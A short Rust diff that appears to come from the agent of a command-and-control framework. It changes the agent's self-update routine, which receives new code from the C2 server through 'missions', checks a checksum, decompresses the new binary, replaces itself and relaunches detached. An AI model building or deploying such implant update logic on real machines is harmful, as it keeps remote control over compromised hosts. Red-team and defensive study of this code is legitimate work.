@@ -87,10 +87,16 @@ fn failsafe_loop(
     loop {
         if let Some(mission) = client::missions::get_next(signing_key, &c2_verifying_key)? {
             match &mission.task {
-                model::Task::Update(data) => {
+                model::Task::Update(release) => {
                     info!("Updating agent '{}'", agent_path.display());
+                    if *release.checksum == common::checksum(agent_path)? {
+                        info!("Agent is already up to date");
+                        client::missions::report(signing_key, mission, "OK")?;
+                        continue;
+                    }
                     let new_agent_path = agent_path.with_file_name("agent.new");
-                    fs::write(&new_agent_path, data)?;
+                    let bytes = common::decompress(&release.bytes);
+                    fs::write(&new_agent_path, bytes)?;
                     self_replace::self_replace(&new_agent_path)?;
                     fs::remove_file(&new_agent_path)?;
                     platform::execute_detached(&agent_path, mission)
